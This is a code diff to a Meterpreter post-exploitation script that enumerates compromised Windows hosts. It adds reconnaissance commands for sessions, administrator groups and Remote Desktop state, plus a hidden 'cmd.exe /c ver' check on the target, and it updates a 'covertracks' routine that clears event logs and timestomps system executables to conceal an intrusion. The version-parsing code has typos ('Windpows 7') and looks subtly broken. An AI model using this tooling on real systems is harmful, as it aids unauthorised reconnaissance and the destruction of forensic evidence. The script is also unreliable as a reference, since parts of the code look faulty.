@@ -3,7 +3,7 @@
 #Meterpreter script for basic enumeration of Windows 2000, Windows 2003, Windows Vista
 # and Windows XP targets using native windows commands.
 #Provided by Carlos Perez at carlos_perez[at]darkoperator.com
-#Verion: 0.3.2
+#Verion: 0.3.4
 #Note: Compleatly re-writen to make it modular and better error handling.
 #      Working on adding more Virtual Machine Checks and looking at improving
 #      the code but retain the independance of each module so it is easier for
@@ -33,13 +33,18 @@ commands = [
 	'ipconfig /displaydns',
 	'route print',
 	'net view',
-	'netstat -na',
+	'netstat -nao',
+	'netstat -vb',
 	'netstat -ns',
 	'net accounts',
+	'net accounts /domain',
+	'net session',
 	'net share',
 	'net group',
 	'net user',
 	'net localgroup',
+	'net localgroup administrators',
+	'net group administrators',
 	'net view /domain',
 	'netsh firewall show config',
 	'tasklist /svc'
@@ -62,11 +67,12 @@ cmdstomp = [
 wmic = [
 	'computersystem list',
 	'useraccount list',
-	'group',
+	'group list',
 	'service list brief',
 	'volume list brief',
 	'process list brief',
 	'startup list full',
+	'rdtoggle list',
 	'qfe',
 ]
 #Specific Commands for Windows vista for Wireless Enumeration
@@ -83,6 +89,12 @@ nonwin2kcmd = [
 	'tasklist.exe',
 	'wbem\\wmic.exe',
 	'netsh.exe',
+]
+# Executables not pressent in Windows 2000
+nowin2kexe = [
+	'netsh.exe',
+	'tasklist.exe',
+	'wbem\\wmic.exe',
 ]
 ################## Function Declarations ##################
 
@@ -357,7 +369,7 @@ end
 def covertracks(session,cmdstomp)
 	clrevtlgs(session)
 	info = session.sys.config.sysinfo
-	trgtos = info['OS']
+	trgtos = winver(session)
 	if trgtos =~ /(Windows 2000)/
 		chmace(session,cmdstomp - nonwin2kcmd)
 	else
@@ -488,6 +500,36 @@ def killApp(session,procpid)
 	session.sys.process.kill(procpid)
 	print_status("Old process #{procpid} killed.")
 end
+#-------------------------------------------------------------------------------
+def winver(session)
+	stringtest = ""
+	verout = []
+	r = session.sys.process.execute("cmd.exe /c ver", nil, {'Hidden' => 'true','Channelized' => true})
+		while(d = r.channel.read)
+			stringtest << d
+		end
+	r.channel.close
+	r.close
+
+	verout, minor, major = stringtest.scan(/(\d)\.(\d)\.(\d*)/)
+	version = nil
+	if verout[0] == "6"
+		if verout[1] == "0"
+			version = "Windows Vista/Windows 2008"
+		elsif verout[1] == "1"
+			version = "Windpows 7"
+		end
+	elsif verout [0] == "5"
+		if verout[1] == "0"
+			version = "Windows 2000"
+		elsif verout[1] == "1"
+			version = "Windows XP"
+		elsif verout[1] == "2"
+			version = "Windows 2003"
+		end
+	end
+	version
+end
 
 #---------------------------------------------------------------------------------------------------------
 # Function to execute process migration
@@ -537,7 +579,7 @@ if helpopt != 1
 	header << "Host:       #{info['Computer']}\n"
 	header << "OS:         #{info['OS']}\n"
 	header << "\n\n\n"
-	trgtos = info['OS']
+	trgtos = winver(session)
 	print_status("Saving report to #{dest}")
 	filewrt(dest,header)
 	filewrt(dest,chkvm(session))
@@ -566,7 +608,11 @@ if helpopt != 1
 	end
 	if (cm != nil)
 		filewrt(dest,"EventLogs where Cleared")
-		covertracks(session,cmdstomp)
+		if trgtos =~ /(Windows 2000)/
+			covertracks(session,cmdstomp - nowin2kexe)
+		else
+			covertracks(session,cmdstomp)
+		end
 	end
 	print_status("Done!")
 end
